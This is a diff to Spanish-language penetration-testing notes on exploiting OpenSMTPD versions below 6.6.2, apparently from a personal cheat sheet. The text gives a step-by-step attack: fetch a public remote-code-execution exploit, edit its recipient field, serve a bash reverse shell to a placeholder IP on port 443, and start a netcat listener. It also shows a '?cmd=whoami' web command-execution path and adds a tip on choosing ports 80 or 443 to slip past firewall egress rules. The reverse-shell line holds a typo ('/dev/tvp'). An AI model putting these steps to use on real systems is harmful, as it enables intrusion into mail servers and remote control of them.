@@ -44,10 +44,10 @@ Nota:
 	1. La cmd se encontrará en la web '/var/mail/dir?cmd=whoami'
 ```
 
-## Explotar OpenSMTPD
+## Explotar OpenSMTPD - Versión < 6.6.2
 
 ```bash 
-# La versión < 6.6.1 es vulnerable 
+# El script de la versión < 6.6.1 es vulnerable 
 
 ❯ searchsploit opensmntpd     # Escoger el que se llama 'Remote Code Execution - 47984.py'
 	# Descargar el exploit con el parametro '-m'
@@ -61,7 +61,7 @@ Nota:
 
 
 Notas:
-	1. Modificar la parte de 'Payload sent' y agregar un nombre de usuario valido en la parte de 'RCPT TO:<root>' en el exploit 
+	1. Opcional: Si no funciona, modificar el 'Payload sent' y agregar un usuario valido en 'RCPT TO:<root>' en el exploit 
 	2. Compartir el archivo que contiene la revershell con python 'python3 -m http.server 80'
 	3. Antes de ejecutar el tercer comando, se deb de estar en modo escucha con 'Netcat'
 ```
@@ -70,6 +70,10 @@ Notas:
 ❯ nano index.html        # Archivo con la revershell 
 	#!/bin/bash 
 	bash -i >& /dev/tvp/IP/443 0>&1
+
+
+NOTA:
+	- A veces se usa el puerto 80 (o 443) porque las reglas de salida del firewall solo permiten tráfico por esos puertos
 ```
 
 ## Explotar OpenSMTPD - Versión 8.13.4 (Debian Sarge)
